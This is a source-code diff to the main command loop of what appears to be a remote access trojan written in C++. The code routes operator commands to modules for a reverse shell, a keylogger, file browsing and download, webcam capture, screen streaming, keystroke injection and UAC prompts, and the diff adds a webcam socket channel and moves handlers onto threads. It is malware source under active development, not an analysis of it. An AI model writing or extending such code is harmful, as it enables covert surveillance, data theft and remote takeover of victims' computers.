@@ -25,7 +25,13 @@
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
 
-std::vector<std::string> socket_conf_list = {"MAIN", "FILE_MANAGER", "DOWNLOAD_UPLOAD", "REVERSE_SHELL", "KEYLOGGER", "PERMISSION"};
+std::vector<std::string> socket_conf_list = {"MAIN",
+                                             "FILE_MANAGER",
+                                             "DOWNLOAD_UPLOAD",
+                                             "REVERSE_SHELL",
+                                             "KEYLOGGER",
+                                             "PERMISSION",
+                                             "WEBCAM"};
 
 void add_connection(const std::string &key, Stream &stream) {
     std::lock_guard<std::mutex> lock(connections_mutex);
@@ -102,10 +108,13 @@ int main(int argc = 0, char *argv[] = nullptr) {
             Download download(stream);
             stream = *get_connection("REVERSE_SHELL");
             ReverseShell reverseShell(stream);
-            stream =  *get_connection("KEYLOGGER");
+            stream = *get_connection("KEYLOGGER");
             keyLogger.setStream(stream);
             stream = *get_connection("PERMISSION");
             Permission permission(stream);
+            stream = *get_connection("WEBCAM");
+            DeviceEnumerator deviceEnumerator(stream);
+            WebcamManager webcamManager(stream);
             stream = *get_connection("MAIN");
             MessageBoxGUI messageBoxGUI(stream);
             KeyboardExecuter keyboardExecuter(stream);
@@ -158,11 +167,11 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
                     case 2: {  // Reading disks of system
-                        threadGen.runInNewThread(&fileManager,&FileManager::sendDisks);
+                        threadGen.runInNewThread(&fileManager, &FileManager::sendDisks);
                         break;
                     }
                     case 3: { // Read all directory (files and folders)
-                        threadGen.runInNewThread(&fileManager,&FileManager::sendDirectory, jsonObject);
+                        threadGen.runInNewThread(&fileManager, &FileManager::sendDirectory, jsonObject);
                         break;
                     }
                     case 5: { // download file or directory
@@ -190,7 +199,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
                     case 11: { // executes command on shell
-                        threadGen.runInNewThread(&reverseShell, &ReverseShell::send);
+                        threadGen.runInNewThread(&reverseShell, &ReverseShell::executeCommandAndSendResult, jsonObject);
                         break;
                     }
 //#ifdef KEYLOGGER_DEF
@@ -204,21 +213,18 @@ int main(int argc = 0, char *argv[] = nullptr) {
                     }
 //#endif
 #ifdef WEBCAM
-                        case 16: { // send webcam devices
-                            DeviceEnumerator deviceEnumerator(stream);
-                            deviceEnumerator.send();
-                            break;
-                        }
+                    case 16: { // send webcam devices
+                        threadGen.runInNewThread(&deviceEnumerator, &DeviceEnumerator::sendWebcamDevices);
+                        break;
+                    }
 
-                        case 17: { // downloadContent webcam with custom features
-                            WebcamManager webcamManager(stream);
-                            webcamManager.startWebcam();
-                            break;
-                        }
+                    case 17: { // downloadContent webcam with custom features
+                        threadGen.runInNewThread(&webcamManager, &WebcamManager::startWebcam, jsonObject);
+                        break;
+                    }
 #endif
                     case 18: { // keyboard executer, executeCommand custom order of keyboard strokes and delays
                         threadGen.runInNewThread(&keyboardExecuter, &KeyboardExecuter::executeCommand, jsonObject);
-
                         break;
                     }
                     case 20: { // send result of UAC dialog
@@ -226,15 +232,15 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
                     case 21: { // open messagebox with custom features
-                        threadGen.runInNewThread(&messageBoxGUI, &MessageBoxGUI::generateMessageBox,jsonObject);
+                        threadGen.runInNewThread(&messageBoxGUI, &MessageBoxGUI::generateMessageBox, jsonObject);
                         break;
                     }
 #ifdef WEBCAM
-                        case 22: { // downloadContent screen streaming
-                            ScreenStreamer screenStreamer(stream);
-                            screenStreamer.send();
-                            break;
-                        }
+                    case 22: { // downloadContent screen streaming TODO fix screen controlling and new thread and socket
+                        ScreenStreamer screenStreamer(stream);
+                        screenStreamer.send();
+                        break;
+                    }
 #endif
                     case 23: { // log off
                         SystemState::setState(0);
